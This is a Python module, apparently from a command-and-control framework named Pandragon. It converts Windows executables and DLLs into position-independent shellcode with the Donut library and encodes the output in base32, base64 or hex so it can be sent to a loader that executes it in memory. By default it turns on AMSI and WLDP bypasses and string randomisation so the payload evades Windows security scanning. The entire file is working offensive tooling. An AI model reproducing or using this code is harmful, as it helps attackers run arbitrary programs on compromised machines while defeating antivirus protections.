#!/usr/bin/env python3
"""
Server-side Donut Integration for Pandragon

Converts PE files (.exe, .dll) to PIC shellcode using Donut,
then sends a shellcode loader BOF to execute it.
"""

import base64
import logging
import tempfile
import os
from typing import Optional, Tuple

logger = logging.getLogger('pandragon.donut')

try:
    import donut
    DONUT_AVAILABLE = True
except ImportError:
    DONUT_AVAILABLE = False
    logger.warning("donut-shellcode not available - PE execution disabled")


class DonutExecutor:
    """Handles PE -> shellcode conversion via Donut."""
    
    def __init__(self):
        if not DONUT_AVAILABLE:
            raise RuntimeError("donut-shellcode not installed")
    
    def pe_to_shellcode(
        self,
        pe_path: str,
        cls: Optional[str] = None,
        method: Optional[str] = None,
        params: Optional[str] = None,
        runtime: str = "v4.0.30319",
        arch: int = 2,  # 1=x86, 2=x64, 3=both
        bypass: int = 3  # 1=Amsi, 2=Wldp, 3=both
    ) -> bytes:
        """
        Convert PE to PIC shellcode using Donut.
        
        Args:
            pe_path: Path to .exe or .dll
            cls: .NET class name (for .NET assemblies)
            method: .NET method name (for .NET assemblies)  
            params: Parameters to pass to method
            runtime: .NET runtime version
            arch: Architecture (1=x86, 2=x64, 3=both)
            bypass: AMSI/WLDP bypass (1=Amsi, 2=Wldp, 3=both)
        
        Returns:
            PIC shellcode bytes
        """
        # Use donut.create() - returns shellcode bytes
        shellcode = donut.create(
            file=pe_path,
            cls=cls,
            method=method,
            params=params,
            runtime=runtime,
            arch=arch,
            bypass=bypass,
            compress=1,  # LZNT1 compression
            entropy=1,   # Randomize strings
        )
        
        if not shellcode:
            raise RuntimeError("Donut returned empty shellcode")
        
        logger.info(f"Generated {len(shellcode)} bytes of PIC shellcode from {pe_path}")
        return shellcode
    
    def pe_to_shellcode_from_bytes(
        self,
        pe_bytes: bytes,
        **kwargs
    ) -> bytes:
        """Convert PE from bytes to shellcode (writes to temp file first)."""
        with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
            f.write(pe_bytes)
            temp_path = f.name
        try:
            return self.pe_to_shellcode(temp_path, **kwargs)
        finally:
            try:
                os.unlink(temp_path)
            except:
                pass


def encode_shellcode(shellcode: bytes, encoding: str = 'base32') -> str:
    """Encode shellcode for transport."""
    if encoding == 'base32':
        return base64.b32encode(shellcode).decode('ascii')
    elif encoding == 'base64':
        return base64.b64encode(shellcode).decode('ascii')
    elif encoding == 'hex':
        return shellcode.hex()
    else:
        raise ValueError(f"Unknown encoding: {encoding}")


def decode_shellcode(encoded: str, encoding: str = 'base32') -> bytes:
    """Decode shellcode from transport format."""
    if encoding == 'base32':
        return base64.b32decode(encoded.upper().encode('ascii'))
    elif encoding == 'base64':
        return base64.b64decode(encoded.encode('ascii'))
    elif encoding == 'hex':
        return bytes.fromhex(encoded)
    else:
        raise ValueError(f"Unknown encoding: {encoding}")
